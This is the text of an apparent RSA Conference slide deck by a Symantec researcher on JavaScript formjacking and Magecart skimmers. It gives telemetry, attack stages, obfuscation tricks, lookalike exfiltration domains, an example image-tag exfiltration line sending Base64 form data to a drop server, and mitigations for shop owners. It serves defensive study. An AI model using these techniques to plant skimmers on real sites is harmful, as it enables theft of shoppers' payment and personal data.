SESSION ID: HT-T12
JavaScript Skimmers, Formjacking and Magecart: All You Need to Know

Candid Wueest
Sr. Principal Threat Researcher Symantec (a Division of Broadcom) @MyLaocoon

Link to whitepaper on formjacking 

#RSAC

#RSAC
JavaScript Skimming  Formjacking  Magecart

Formjacking is the use of malicious JavaScript to transparently steal payment card information and Personally Identifiable Information (PII) entered by users on compromised websites

Customer

JS
Online Shop

Merchant
Attacker
Attacker receives a copy of the form data through
the injected JavaScript
2

It is difficult to detect for the customer, as no malware is installed locally and the SSL cert is valid

#RSAC
Typical Formjacking Sequence

Server Infection

Hide Script

Script Trigger

Gather Data

Exfiltrate Data

3

#RSAC
Not Really a New Concept
· Keyloggers: JavaScript, CSS, XSS,Web-Injects,... · FFSniff browser extension in 2006
4

Formjacking Demo

#RSAC

... let's go shopping

5

#RSAC
VIDEO

Formjacking Incidents

·

There were a number of high profile victims (e.g. Ticketmaster,

Rank

British Airways, Macy's)

1

· Symantec telemetry shows that 2

majority of victims are SMBs

3

4
· Multiple attack groups active,

e.g. Magecart #6

5

· May lead to fines, e.g. British

6

Airways $229 million GDPR fine 7

12 / 2019

Country Percent

USA France Australia

42.2% 25.4% 4.4%

Canada
United Kingdom Germany
Brazil

3.3% 2.2% 1.9% 1.8%

#RSAC

09 / 2019

06 / 2019

Country Percent Country Percent

USA
Australia
Brazil United Kingdom Canada

60.1% 5.3% 4.5% 3.6% 3.0%

USA 58.2%

Australia 6.1%

India
United Kingdom

5.0% 4.2%

Brazil 3.7%

India Mexico

2.9%

Canada 2.7%

2.2%

Japan 2.2%

Source: Symantec IPS telemetry

7

Formjacking Detections and Infections

1,200,000

Endpoint IPS detections

Infected domains

1,000,000

800,000

600,000

400,000

200,000

0

#RSAC
9,000 8,000 7,000 6,000 5,000 4,000 3,000 2,000 1,000 0

Jan-18 Feb-18 Mar-18 Apr-18 May-18 Jun-18 Jul-18 Aug-18 Sep-18 Oct-18 Nov-18 Dec-18 Jan-19 Feb-19 Mar-19 Apr-19 May-19 Jun-19 Jul-19 Aug-19 Sep-19 Oct-19 Nov-19 Dec-19

Source: Symantec IPS telemetry
8

Alexa Web Ranking of Infected Domains

· Average rating: 2,430,373 (Q4 - only 54% ranked)

Shopping [48.3%] Business [14.2%] Services [11.4%] Computers [5.1%] Publications [4.0%] News [2.8%] Recreation [2.8%] Society [2.3%] Health [1.1%] Travel [1.1%] Others [6.8%]

Category Shopping

Ranking

48%

Source: Symantec IPS telemetry Q4/2019
9

#RSAC
Health [14.5%] Home and Garden [14.5%] Clothing [9.2%] Vehicles [7.9%] Food [6.6%] Sports [6.6%] Small Ad [5.3%] Consumer Electronics [5.3%] Entertainment [5.3%] Recreation [5.3%] Industrial Goods and Services [3.9%] General Merchandise [3.9%] Music [3.9%] Crafts [2.6%] Others [5.2%]

#RSAC
Step 1: Get the Script onto the Server
Own vulnerable infrastructure
· CMS (e.g. WordPress, Typo3, Joomla,...) · eCommerce platforms (e.g. Magento Commerce) · Server setup (e.g. Apache Struts 2, P-XSS, scripts,...) · Account takeover (e.g. phishing, data breaches,...)
Third-party resources
· Third-party script compromise / supply chain attacks · S3 buckets, GitHub repository, cloud provider · MitM injection (e.g. rogue Wi-Fi hotspots)
10

#RSAC
Step 2: Many Ways to Inject the Script
· Directly in the HTML/PHP with a <script> tag · Link to a remote server, e.g. <script SRC='...'>
­ Can be multiple stages and can clean up itself (e.g. Pipka)
· New function added to a script (function inlining) · Often at the end of legitimate decoy scripts · Standalone file on the server · Automatically added through third-party scripts (72% in Q4)
checkout https://e-shop-tracking.com/js/cdn-tracking.js
11

#RSAC

#RSAC
LEGIT
13

#RSAC
14

#RSAC
Often Personalized for Each Victim
Mimicking known Domains:
· google-analyitics.org · google-analytics.cm · mygoogletagmanager.org · googietagmanagar.com · googlc-analytics.cm · google-analytîcs.com · api-googles.com · gstaticss.com · tracker-visitors.com · track-magento.com
15

#RSAC
Script Obfuscation
· HEX & BASE64 encoding, string manipulation - the «usual» methods · Anti-analysis / anti-debugging code
­ Detect browser developer tools (F12) ­ Integrity checksum, RSA, timing check ­ IP, OS & browser agent checks (e.g. Linux or AWS?) ­ Mismatched file types, e.g. images
· Payload delivery only if referrer is correct  else clean file
16

Step 3: Script Activation

Script is only activated if keyword is found, e.g. checkout and if there is a web form

Method
On form submit On key press On mouse event On page unload On timeout On changes

Description
Add its own script function to the submit button of the web form Run a keylogger in the background and protocol all key strokes React to specific mouse events, often related to the web form's submit button Wait until the page is unloaded, which often happens when the user is redirected Set a timeout every X milliseconds and scrape all web form data if it has changed With functions like addEventListener the script can be triggered when data is entered

Monitor web forms for changes:

#RSAC

17

#RSAC
Step 4: Gathering the Data
· Find the web form · Read out all fields
Input, Select, TextArea,...
· Read it directly, if field names are known
· Steal cookies as well · Send domain name · Sometimes they add
fake forms or redirects
18

#RSAC
Step 5: Exfiltrating Data
19

#RSAC
Step 5: Exfiltrating Data
· Obfuscate data with BASE64 or encrypt it · Often simple HTTPS GET / POST request (with free SSL certificate)
­ e.g. add an image tag and send data as argument ­ <img src=dropserver.tld/img=?[DATA as BASE64]>
· Can use functions to send data
­ XHR, Fetch, Server-sent Events (SSE), WebRTC, WebSockets, relocate,... ­ Temporarily stored in a cookie, Curl, Wget,...
· Difficult to detect if saved locally on the server or sent to compromised third party
Send data with dynamic image tag:
20

#RSAC
«Easy to Use» Formjacking Toolkits
21

#RSAC
Most of the Time a Slow Removal
· On average 46 days infected · Some shops were infected for over a year (Bulletproof hosting)
10,000
Number of infected domains per time (logarithmic)
1,000

100

10

1

1 10 19 28 37 46 55 64 73 82 91 100 109 118 127 136 145 154 163 172 181 190 199 208 217 226 235 244 253 262 271 280 289 298 307 316 325 334 343 352 361 370 379

Number of days infected
22

Source: Symantec IPS telemetry of 20'000 compromised domains in 2019

Not Always Easy to Help
Hi candid, Thank you for your report. Could you show us proof why this script is malicious? Right now the only reason seems to be because it's obfuscated which isn't enough proof. Kind regards
23

#RSAC

#RSAC
Mitigation Tips

Shop Owners
· Harden you server infrastructure
· Know your website and log changes
· Make the «checkout» as static and empty as possible
· Check your supply chain & evaluate local copies of remote scripts
· Secure your store with CSP/SRI
· Evaluate fully hosted checkout solutions (third party)

Customer/Clients
· MFA or push notifications for cards · Token or one-time payment cards · Storing the card at the shop · Opening the developer toolkit (F12)
can protect in some cases · Monitor your card's statements

24

#RSAC
Summary ­ Formjacking - JavaScript Skimmers
· Simple to conduct ­ lucrative · Difficult to detect/protect for the customer · Many JavaScript skimmer scripts available · Not just stealing payment card details, but also passwords · If you got hit, fix the way they came in · Make it easy to report infections
25

#RSAC
Apply Slide - Formjacking
NEXT WEEK YOU SHOULD:
· Analyze if your website has formjacking code on it
IN THE NEXT THREE MONTHS:
· Verify that your web server is hardened and updated · Verify the access controls to your web server
WITHIN SIX MONTHS:
· Create a process to secure all third-party resources used by your website, e.g. CSP/SRI
26

SESSION ID: HT-T12
Thank you for your attention!

Candid Wueest

Candid.Wueest@Broadcom.com

Sr. Principal Threat Researcher Symantec (a Division of Broadcom) @MyLaocoon

Link to whitepaper on formjacking 

#RSAC

